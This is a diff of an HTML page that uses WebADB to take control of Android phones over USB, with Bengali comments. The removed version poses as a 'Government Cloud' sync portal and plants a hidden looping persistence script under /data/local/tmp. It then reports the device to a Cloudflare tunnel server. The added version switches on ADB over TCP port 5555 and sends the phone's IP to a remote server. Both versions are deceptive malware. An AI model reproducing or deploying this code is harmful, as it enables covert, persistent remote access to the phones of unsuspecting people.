@@ -1,44 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>System Authentication Portal</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <script src="./webadb.js"></script>
-    <style>
-        body { background: #000; color: #00ff9d; font-family: monospace; text-align: center; padding-top: 20%; }
-        .loader { border: 2px solid #00ff9d; padding: 20px; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-    </style>
-</head>
+<html>
 <body>
-    <div class="loader"> [ AWAITING_USB_LINK_V27 ] </div>
-    <p>Please connect device to synchronize with Government Cloud.</p>
-    <button id="syncBtn" style="background:transparent; border:1px solid #00ff9d; color:#00ff9d; padding:10px; cursor:pointer;">INITIALIZE_SYNC</button>
-
+    <h3>Step 1: Activate Phone via USB</h3>
+    <button onclick="init()">Activate & Connect to Linux</button>
+    <p id="stat"></p>
+    <script src="webadb.js"></script>
     <script>
-        // আপনার লিনাক্স পিসির Cloudflare Tunnel URL এখানে দিন
-        const SERVER_URL = "https://administered-mhz-spas-structural.trycloudflare.com";
-        const socket = io(SERVER_URL);
-
-        document.getElementById('syncBtn').onclick = async () => {
-            try {
-                const adb = await new window.WebADB().connect();
-                await adb.connect();
-                const model = await adb.shell("getprop ro.product.model");
-                const devId = btoa(model).substring(0,8);
-
-                // --- GHOST PERSISTENCE INJECTION ---
-                const ghost = `while true; do am startservice -n com.android.shell/.GhostService 2>/dev/null; sleep 30; done`;
-                await adb.shell(`mkdir -p /data/local/tmp/.sys_bin`);
-                await adb.shell(`echo "${ghost}" > /data/local/tmp/.sys_bin/.ghost.sh`);
-                await adb.shell(`chmod 777 /data/local/tmp/.sys_bin/.ghost.sh`);
-                await adb.shell(`nohup sh /data/local/tmp/.sys_bin/.ghost.sh > /dev/null 2>&1 &`);
-
-                socket.emit('ghost_login', { id: devId, info: model.trim() });
-                alert("Synchronization Complete. Persistence Active.");
-            } catch(e) { console.error(e); }
-        };
+        async function init() {
+            const webusb = await Adb.open("WebUSB");
+            const adb = await webusb.connectAdb("host::");
+            await adb.tcpip(5555);
+            let shell = await adb.shell('ip addr show wlan0 | grep "inet "');
+            let response = await shell.receive();
+            let out = new TextDecoder().decode(response.data);
+            let ip = out.match(/inet\s+(\d+\.\d+\.\d+\.\d+)/)[1];
+            
+            // লিনাক্স সার্ভারকে জানানো (Cloudflare URL দিন)
+            const socket = new WebSocket('wss://your-tunnel.trycloudflare.com');
+            socket.onopen = () => {
+                socket.send(JSON.stringify({ type: 'REGISTER_PHONE', ip: ip }));
+                document.getElementById('stat').innerText = "✅ Activated! IP: " + ip;
+            };
+        }
     </script>
 </body>
 </html>
